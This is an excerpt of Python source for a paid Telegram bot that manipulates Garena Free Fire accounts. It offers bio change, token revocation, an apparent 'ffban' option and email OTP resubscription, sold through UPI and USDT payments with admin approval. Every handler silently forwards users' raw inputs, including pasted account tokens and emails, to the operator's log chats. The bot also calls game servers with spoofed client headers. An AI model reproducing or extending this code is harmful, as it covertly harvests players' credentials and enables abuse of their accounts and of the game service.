        await send_log(context, f"📥 {revoke_token_confirm}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {revoke_token_confirm}: {_e}")
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
...
async def bio_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bio_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bio_start}: {_e}")
...
async def bio_token(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bio_token}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bio_token}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def bio_text(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bio_text}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bio_text}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def bio_color(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bio_color}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bio_color}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def bio_confirm(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {bio_confirm}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {bio_confirm}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
                    ...
                    for url in urls:
                        for p_type in platforms:
                            try:
                                ...
                                headers_jwt = {"User-Agent": "Dalvik/2.1.0", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Type": "application/octet-stream", "X-GA": "v1 1", "X-Unity-Version": "2018.4.11f1", "ReleaseVersion": "OB55"}
...
async def resubscribe_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {resubscribe_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {resubscribe_start}: {_e}")
    user_id = update.message.from_user.id
    if is_admin(user_id) or is_paid(user_id, "resub"):
        await update.message.reply_text("📧 𝗥𝗘𝗦𝗨𝗕𝗕𝗜𝗖𝗥𝗜𝗕𝗘 𝗢𝗧𝗣 📧\n\n✉️ 𝗬𝗢𝗨𝗥 𝗘𝗠𝗔𝗜𝗟 💎", reply_markup=get_main_keyboard())
        return RESUB_EMAIL
    else:
        return await show_payment_page(update, context, "resub")
...
async def resubscribe_email(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {resubscribe_email}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {resubscribe_email}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    email = update.message.text.strip()
    try:
        await send_log(context, f"📧 EMAIL INPUT\nUser: {_uid if '_uid' in locals() else 0}\nEmail: {email}")
    except:
        pass
...
async def platform_start(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {platform_start}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {platform_start}: {_e}")
...
async def platform_token(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {platform_token}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {platform_token}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token = update.message.text.strip()
    try:
    ...
    try:
        def fetch():
            ...
            headers = {
                'User-Agent': "GarenaMSDK/4.0.45P5(Redmi Note 5 ;Android 13;en;US;)",
                'Connection': "Keep-Alive",
                'Accept-Encoding': "gzip"
            }
...
# ========== PAYMENT PROOF HANDLER - HIDDEN + FAKE CHECK + ADMIN BUTTONS ==========
async def payment_callback_handler(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {payment_callback_handler}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {payment_callback_handler}: {_e}")
    """Handle payment method selection: UPI or USDT"""
    ...
    try:
        if data.startswith("pay_upi_"):
            option_key = data.replace("pay_upi_", "")
            await query.message.delete()
            # Show UPI QR only
            return await show_qr_page(query, context, option_key, "upi")
        elif data.startswith("pay_usdt_"):
            option_key = data.replace("pay_usdt_", "")
            await query.message.delete()
            return await show_qr_page(query, context, option_key, "usdt")
        elif data.startswith("pay_cancel_"):
            await query.message.delete()
            await context.bot.send_message(chat_id=query.message.chat_id, text="❌ Cancelled! /start", reply_markup=get_main_keyboard())
            return ConversationHandler.END
    except Exception as e:
...
async def admin_callback_handler(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {admin_callback_handler}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {admin_callback_handler}: {_e}")
    """Handle admin Yes/No buttons - only admin can click"""
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user
    ...
    try:
        if data.startswith("admin_yes_"):
            # admin_yes_{user_id}_{option}
            parts = data.replace("admin_yes_", "").split("_")
            target_id = int(parts[0])
            option_key = "_".join(parts[1:])
            
            mark_paid(target_id, option_key, days=30)
            
            # Mark UTR as used if available in pending
            try:
                pending_db = load_pending_db()
                uid_str = str(target_id)
                if uid_str in pending_db:
                    for entry in pending_db[uid_str]:
                        if entry.get("option") == option_key and "proof_text" in entry:
                            mark_utr_used(entry["proof_text"], target_id)
                    # Remove from pending
                    pending_db[uid_str] = [x for x in pending_db[uid_str] if x.get("option") != option_key]
                    if not pending_db[uid_str]:
                        del pending_db[uid_str]
                    save_pending_db(pending_db)
            except Exception as e:
                print(f"[ADMIN YES] Pending cleanup error: {e}")
            
            await query.edit_message_text(f"✅ Approved! 💎\n👤 User {target_id} | {option_key} unlocked 30 days\nApproved by: {user.id}\n@just_zevric")
            
            # Notify user
            try:
                opt_name = PAID_OPTIONS[option_key]["name"]
                await context.bot.send_message(chat_id=target_id, text=f"🎉 Payment Approved! 💎\n\n✅ {opt_name} Unlocked! 🔓\n⏰ 30 Days Valid\n🚀 Ab /start dabao aur option use karo\n\n👑 @just_zevric")
            except Exception as e:
                print(f"[ADMIN YES] Notify error: {e}")
        
        elif data.startswith("admin_no_"):
            parts = data.replace("admin_no_", "").split("_")
            target_id = int(parts[0])
            option_key = "_".join(parts[1:])
            ...
            await query.edit_message_text(f"❌ Rejected! User {target_id} | {option_key}\nBy: {user.id}\n@just_zevric")
            try:
                await context.bot.send_message(chat_id=target_id, text=f"❌ Payment Rejected! 😔\n\nOption: {PAID_OPTIONS.get(option_key, {}).get('name', option_key)}\n💡 Sahi UTR/TxID bhejo, QR se pay karo\n📸 Fake screenshot mat bhejo\n💬 @just_zevric se baat karo")
            except:
                pass
    except Exception as e:
...
async def payment_proof_handler(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {payment_proof_handler}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {payment_proof_handler}: {_e}")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    
    user = update.message.from_user
    user_id = user.id
    option_key = context.user_data.get('pending_paid_option', 'unknown')
    payment_method = context.user_data.get('payment_method', 'upi')
    opt_info = PAID_OPTIONS.get(option_key, {"name": "Premium", "price_inr": 0, "price_usdt": 0})
    ...
    if update.message.text:
        ...
        proof_text = update.message.caption.strip()
    
    # Check if photo sent
    has_photo = bool(update.message.photo)
    
    # Fake check - must have photo
    if not has_photo:
        await update.message.reply_text(f"❌ Screenshot bhejo! 📸\n💳 Sirf UTR/TxID se nahi hoga\n📸 Payment ka screenshot + UTR/TxID dono bhejo\n\n@just_zevric", reply_markup=get_main_keyboard())
        return PAYMENT_PROOF
    
    # Fake UTR check
    if not proof_text or len(proof_text) < 5:
        await update.message.reply_text(f"❌ UTR/TxID bhi likho! ✍️\n📸 Screenshot ke saath UTR/TxID likhna zaroori hai\nEx: UPI 12 digit UTR ya USDT TxID\n\n@just_zevric", reply_markup=get_main_keyboard())
        return PAYMENT_PROOF
    
    is_valid, msg = is_valid_utr(proof_text, payment_method)
    if not is_valid:
        await update.message.reply_text(f"❌ {msg} 😔\n\n💡 Sahi UTR/TxID bhejo\n📸 Fake mat bhejo, ban ho jaoge\n\n@just_zevric", reply_markup=get_main_keyboard())
        return PAYMENT_PROOF
    ...
    try:
        pending_db = load_pending_db()
        uid_str = str(user_id)
        if uid_str not in pending_db:
            pending_db[uid_str] = []
        
        entry = {
            "option": option_key,
            "name": opt_info["name"],
            "price_inr": opt_info["price_inr"],
            "price_usdt": opt_info["price_usdt"],
        ...
        pending_db[uid_str].append(entry)
        save_pending_db(pending_db)
        
        # Log to main log group also
        try:
            await send_log(context, f"💰 NEW PAYMENT PROOF\nUser: {user_id} @{user.username}\nOption: {option_key} ({opt_info['name']})\nMethod: {payment_method}\nUTR: {proof_text[:100]}")
        except:
            pass
        # Forward to admin with Yes/No buttons
        admin_msg = f"""💰 New Payment! 💎

👤 User: {entry['full_name']} (@{entry['username']})
🆔 ID: {user_id}
💎 Option: {entry['name']} ({option_key})
💳 Method: {payment_method.upper()}
💰 Price: ₹{opt_info['price_inr']} | ${opt_info['price_usdt']} USDT
⏰ Time: {entry['time']}

📝 UTR/TxID: {proof_text[:300]}
📸 Photo: Yes - Check karo fake to nahi

⚠️ Fake check: {msg}
👇 Approve/Reject karo button se"""

        # Send to admins with approval buttons
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(chat_id=admin_id, text=admin_msg, reply_markup=get_admin_approval_keyboard(user_id, option_key))
                if has_photo:
                    try:
                ...
                print(f"[ADMIN FORWARD] Error to {admin_id}: {e}")
        
        if not ADMIN_IDS:
            print("[PAYMENT] No ADMIN_IDS set, payment pending but no admin to approve")
        
        await update.message.reply_text(f"""✅ Proof Received! 💎

👤 {opt_info['name']} | ₹{opt_info['price_inr']} | {payment_method.upper()}
📝 UTR: {proof_text[:50]}...
⏳ Admin check karega 5 min
✅ Yes/No button se approve hoga
💬 Fast: @just_zevric
...
async def approve_command(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {approve_command}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {approve_command}: {_e}")
    user = update.message.from_user
    if not is_admin(user.id):
    ...
    try:
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("Usage: /approve <user_id> <option>\nOptions: change, revoke, ffban, resub\nEx: /approve 123456 change", reply_markup=get_main_keyboard())
            return
        target_id = int(args[0])
        option_key = args[1].lower()
        if option_key not in PAID_OPTIONS:
            await update.message.reply_text(f"❌ Invalid option! Options: {list(PAID_OPTIONS.keys())}", reply_markup=get_main_keyboard())
            return
        ...
        try:
            opt_name = PAID_OPTIONS[option_key]["name"]
            await context.bot.send_message(chat_id=target_id, text=f"🎉 Payment Approved! 💎\n\n✅ {opt_name} Unlocked! 🔓\n⏰ 30 Days Valid\n🚀 Ab use karo, /start dabao\n\n👑 @just_zevric")
        except Exception as e:
            print(f"[APPROVE] Notify user error: {e}")
            await update.message.reply_text(f"⚠️ User ko notify nahi kar paya, par DB me paid mark ho gaya\nError: {e}", reply_markup=get_main_keyboard())
...
async def reject_command(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {reject_command}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {reject_command}: {_e}")
    user = update.message.from_user
    if not is_admin(user.id):
        await update.message.reply_text("❌ Admin only! 👑", reply_markup=get_main_keyboard())
        return
    try:
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("Usage: /reject <user_id> <option>", reply_markup=get_main_keyboard())
            return
        target_id = int(args[0])
        option_key = args[1].lower()
        ...
        await update.message.reply_text(f"❌ Rejected! User {target_id} | {option_key}\n@just_zevric", reply_markup=get_main_keyboard())
        try:
            await context.bot.send_message(chat_id=target_id, text=f"❌ Payment Rejected! 😔\n\nOption: {PAID_OPTIONS.get(option_key, {}).get('name', option_key)}\n💡 UTR/TxID sahi bhejo, QR se pay karo\n💬 @just_zevric se baat karo\n\n@just_zevric")
        except:
            pass
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}", reply_markup=get_main_keyboard())

async def paid_list_command(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {paid_list_command}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {paid_list_command}: {_e}")
    user = update.message.from_user
    if not is_admin(user.id):
        return
    db = load_paid_db()
    pending = load_pending_db()
    txt = f"💎 Paid DB: {len(db)} users\n⏳ Pending: {len(pending)} users\n\n"
    for uid, opts in list(db.items())[:20]:
        txt += f"{uid}: {list(opts.keys())}\n"
    if len(txt) > 4000:
        txt = txt[:4000]
    await update.message.reply_text(txt or "No paid users", reply_markup=get_main_keyboard())
...
async def switch_menu(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {switch_menu}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {switch_menu}: {_e}")
    try:
        u = update.message.from_user
        await send_log(context, f"🔄 Menu: {update.message.text} | User {u.id} @{u.username} | Chat {update.message.chat.id}")
    except:
        pass
    text=update.message.text.strip()
...
async def testlog_command(update, context):
    ...
    try:
        ...
        if update.message and update.message.text:
            ...
            _txt = "📷 Photo sent"
        await send_log(context, f"📥 {testlog_command}\n👤 {_uid} {_uname} {_fname}\n💬 Chat: {_chat_id}\n📝 Input: {_txt}")
    except Exception as _e:
        print(f"[LOG ENTRY FAIL] {testlog_command}: {_e}")
    try:
        user = update.message.from_user
        chat_id = update.message.chat.id
        # Try to send to log group
        try:
            await context.bot.send_message(chat_id=-5373759744, text=f"🧪 TEST LOG\n✅ Logs working!\nUser: {user.id} @{user.username}\nChat: {chat_id}")
            await context.bot.send_message(chat_id=-1005373759744, text=f"🧪 TEST LOG\n✅ Logs working!\nUser: {user.id} @{user.username}\nChat: {chat_id}")
        except Exception as e:
            print(f"Test log send failed: {e}")
        await update.message.reply_text(f"✅ Test log sent\nChat ID: {chat_id}\nLog Group: -5373759744\nIf you see message in log group, logs working!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def logtest_command(update, context):
    await testlog_command(update, context)
...
def main():
    ...
    conv = ConversationHandler(
        ...
        states={
            ...
            PAYMENT_PROOF: [
                MessageHandler(filters.Regex(ALL_MENU), switch_menu),
                MessageHandler(filters.PHOTO, payment_proof_handler),
                MessageHandler(filters.TEXT & ~filters.COMMAND, payment_proof_handler)
            ],
            PAYMENT_METHOD: [
                MessageHandler(filters.Regex(ALL_MENU), switch_menu),
                CallbackQueryHandler(payment_callback_handler, pattern="^pay_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, payment_proof_handler)
            ],
        },
    ...
    app.add_handler(CommandHandler("testlog", testlog_command))
    app.add_handler(CommandHandler("logtest", testlog_command))
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("reject", reject_command))
    app.add_handler(CommandHandler("paidlist", paid_list_command))
    ...
    print("✅ V69 PAID HIDDEN - 4 Paid Options + QR + Admin Hidden ✅💀📧🔍")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"💰 Paid Options: {list(PAID_OPTIONS.keys())}")
    print(f"📋 LOG CHAT IDs: {LOG_CHAT_IDS}")
    # Send startup log to group
    try:
        send_log_sync(f"🚀 BOT STARTED\n✅ V69 FIXED OB55\n📋 Log IDs: {LOG_CHAT_IDS}\n👑 Admins: {ADMIN_IDS}")
    except Exception as e:
        print(f"[LOG] Startup log failed: {e}")
